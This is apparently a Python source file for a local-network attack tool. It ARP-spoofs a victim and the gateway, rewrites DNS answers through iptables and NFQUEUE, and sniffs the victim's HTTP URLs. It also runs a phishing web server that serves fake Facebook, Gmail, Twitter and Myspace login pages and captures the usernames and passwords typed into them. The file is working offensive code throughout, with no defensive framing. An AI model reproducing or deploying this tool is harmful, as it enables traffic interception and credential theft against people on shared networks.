from scapy.all import *
from nfqueue import *
from subprocess import Popen, PIPE, STDOUT
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from cgi import FieldStorage
from socket import socket, AF_INET, gethostbyname
from fcntl import ioctl

conf.verb = 0

Services = {
    "facebook": "https://www.facebook.com/login.php?login_attempt=1",
    "gmail": "https://accounts.google.com/ServiceLoginAuth",
    "twitter": "https://twitter.com/sessions",
    "myspace": "https://myspace.com/ajax/account/signin"}


def nscan(interface):
    my_ip = get_ip(interface)
    gw_ip = get_gateway(interface)
    p = Popen("ip route | grep %s | grep 'src %s' | awk '{print $1}'" % (interface, my_ip),
              shell=True, stdout=PIPE)
    netid = p.communicate()[0].rstrip()

    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst=netid), timeout=2, iface=interface, inter=0.1)

    hosts = []
    for snd, rcv in ans:
        if rcv.psrc not in [gw_ip, my_ip]:
            hosts.append(rcv.psrc)
    return hosts


def get_ip(interface):
    p = Popen("ip route | grep %s | grep 'src' | awk '{print $9}'" % interface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def get_mac(ip, local=False):
    if ip == "255.255.255.255":
        return "ff:ff:ff:ff:ff:ff"
    if local:
        ping(ip)
        p = Popen("arp -a | grep  '(%s)' | awk  '{print $4}'" % ip, shell=True, stdout=PIPE)
        output = p.communicate()[0].rstrip()
        return output
    else:
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
        for snd, rcv in ans:
            return rcv.sprintf("%Ether.src%")


def get_gateway(interface):
    p = Popen("ip route show 0.0.0.0/0 dev %s | awk '{print $3}'" % interface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def valid_ip(s):
    if len(s.split('.')) != 4:
        return False
    for x in s.split('.'):
        if not x.isdigit():
            return False
        if int(x) < 0 or int(x) > 255:
            return False
    return True


def get_if_list():
    f = open("/proc/net/dev", "r")
    lst = []
    f.readline()
    f.readline()
    for l in f:
        interface = l.split(":")[0].strip()
        if interface != "lo":
            lst.append(interface)
    return lst


def get_if_mac(interface):
    s = socket()
    ifreq = ioctl(s, 0x8927, struct.pack("16s16x", interface))
    s.close()
    family, mac = struct.unpack("16xh6s8x", ifreq)
    return ("%02x:"*6)[:-1] % tuple(map(ord, mac))


# def get_dhcp(interface):
#     dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
#             IP(src="0.0.0.0", dst="255.255.255.255") /
#             UDP(sport=68, dport=67) /
#             BOOTP(chaddr=get_if_mac(interface)) /
#             DHCP(options=[("message-type", "discover"),
#                 ("param_req_list",
#                  chr(DHCPRevOptions["router"][0]),
#                  chr(DHCPRevOptions["domain"][0]),
#                  chr(DHCPRevOptions["server_id"][0]),
#                  chr(DHCPRevOptions["name_server"][0]),),
#                 "end"]))
#     ans, unans = srp(dhcp, timeout=6, retry=1)

#     if ans:
#         for s, r in ans:
#             dhcp_opt = r[0][DHCP].options
#             dhcp_ip = r[0][IP].src
#             for opt in dhcp_opt:
#                 if 'domain' in opt:
#                     local_domain = opt[1]
#                     pass
#                 else:
#                     local_domain = 'None'
#                 if 'name_server' in opt:
#                     dns_ip = opt[1]
#     else:
#         dns_ip = get_gateway(interface)
#         dhcp_ip = dns_ip
#         local_domain = 'None'
#     return [dhcp_ip, dns_ip, local_domain]


class URLInspector(object):

    def __init__(self, interface, vic_ip, conn):
        self.interface = interface
        self.vic_ip = vic_ip
        self.conn = conn
        self.past_url = None

    def inspect(self):
        sniff(store=0, filter="port 80 and host %s"
              % self.vic_ip, prn=self.parse, iface=self.interface)

    def parse(self, pkt):
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            load = repr(pkt[Raw].load)[1:-1]

            try:
                headers, body = load.split(r"\r\n\r\n", 1)
            except:
                headers = load
            header_lines = headers.split(r"\r\n")

            url = ""
            post = ""
            get = ""
            host = ""

            for l in header_lines:
                if re.search('[Hh]ost: ', l):
                    try:
                        host = l.split('Host: ', 1)[1]
                    except:
                        try:
                            host = l.split('host: ', 1)[1]
                        except:
                            pass
                if re.search('GET /', l):
                    try:
                        get = l.split('GET ')[1].split(' ')[0]
                    except:
                        pass
                if re.search('POST /', l):
                    try:
                        post = l.split(' ')[1].split(' ')[0]
                    except:
                        pass
            if host and post:
                url = host+post
            elif host and get:
                url = host+get

            if url and not "ocsp" in url:
                skip = [".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]
                if any(i in url for i in skip) or len(url) > 80:
                    pass
                elif not url == self.past_url:
                    self.past_url = url
                    self.conn.send(["url", url])


class HTTPHandler(BaseHTTPRequestHandler):

    def __init__(self, service, conn, *args):
        self.service = service
        self.conn = conn
        BaseHTTPRequestHandler.__init__(self, *args)

    def do_GET(self):
        if self.path == "/":
            self.path = "sites/%s.html" % self.service

        try:
            f = open(self.path)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f.read())
            f.close()
            return

        except IOError:
            self.send_error(404, 'File Not Found: %s' % self.path)

    def do_POST(self):
        if self.path == "/login":
            form = FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST',
                         'CONTENT_TYPE': self.headers['Content-Type']})

            self.conn.send(["cred", self.service, form["user"].value, form["pass"].value])
            self.send_response(200)
            self.end_headers()
            self.wfile.write("<meta http-equiv=\"refresh\" content=\"0; "
                             "url=%s\" />" % Services[self.service])
            return


class WebServer(object):

    def __init__(self, service, port, conn):
        self.service = service
        self.port = port
        self.conn = conn

    def handler(self, *args):
        HTTPHandler(self.service, self.conn, *args)

    def start(self):
        server = HTTPServer(('', self.port), self.handler)
        server.serve_forever()


class Spoofer(object):

    def __init__(self, interface, vic_ip, dst_ip):
        self.interface = interface
        self.vic_ip = vic_ip
        self.dst_ip = dst_ip
        self.dst_mac = get_mac(self.dst_ip)
        self.vic_mac = get_mac(self.vic_ip)

    def arpspoof(self):
        fake_dst = ARP(op=2, hwsrc=get_if_mac(self.interface), psrc=self.vic_ip,
                       pdst=self.dst_ip, hwdst=self.dst_mac)
        fake_vic = ARP(op=2, hwsrc=get_if_mac(self.interface), psrc=self.dst_ip,
                       pdst=self.vic_ip, hwdst=self.vic_mac)

        while True:
            send(fake_vic, count=3)
            send(fake_dst, count=3)
            sniff(filter="arp and (host %s or host %s)" % (self.dst_ip, self.vic_ip),
                  count=1, timeout=1)

    def dnsspoof(self, domain, target, alld, specific=False):
        if valid_ip(target):
            self.target = target
        else:
            self.target = gethostbyname(target)

        if specific:
            self.domain = domain
        else:
            self.domain = domain.split()

        self.specific = specific
        self.alld = alld
        self.queue = queue()
        self.queue.set_callback(self.reply)
        self.queue.fast_open(0, AF_INET)
        self.queue.set_mode(NFQNL_COPY_PACKET)
        Popen("modprobe nfnetlink_queue", shell=True, stdout=PIPE, stderr=STDOUT)
        Popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0",
              shell=True, stdout=PIPE, stderr=STDOUT)
        self.queue.try_run()

    def reply(self, payload):
        data = IP(payload.get_data())
        if not data.haslayer(DNSQR):
            payload.set_verdict(NF_ACCEPT)
        else:
            ip = data[IP]
            udp = data[UDP]
            dns = data[DNS]

            reply = (IP(dst=ip.src, src=ip.dst) /
                     UDP(dport=udp.sport, sport=udp.dport) /
                     DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                         an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.target)))

            if self.specific:
                target_domains = [self.domain, ("%s." % self.domain), ("www.%s." % self.domain)]
                if dns.qd.qname in target_domains:
                    payload.set_verdict(NF_DROP)
                    send(reply)
            else:
                if any(domain in dns.qd.qname for domain in self.domain) or self.alld:
                    payload.set_verdict(NF_DROP)
                    send(reply)

    def restore(self):
        real_dst = ARP(op=2, pdst=self.vic_ip, psrc=self.dst_ip,
                       hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.dst_mac)
        real_vic = ARP(op=2, pdst=self.dst_ip, psrc=self.vic_ip,
                       hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.vic_mac)

        send(real_vic, count=3)
        send(real_dst, count=3)

    def forward(self, enable=True):
        if enable:
            Popen("sysctl -w net.ipv4.ip_forward=1", shell=True, stdout=PIPE, stderr=STDOUT)
        else:
            Popen("sysctl -w net.ipv4.ip_forward=0", shell=True, stdout=PIPE, stderr=STDOUT)

    def flush(self):
        Popen("iptables -F", shell=True, stdout=PIPE)
        Popen("iptables -t nat -F", shell=True, stdout=PIPE)
        Popen("iptables -X", shell=True, stdout=PIPE)
        Popen("iptables -t nat -X", shell=True, stdout=PIPE)
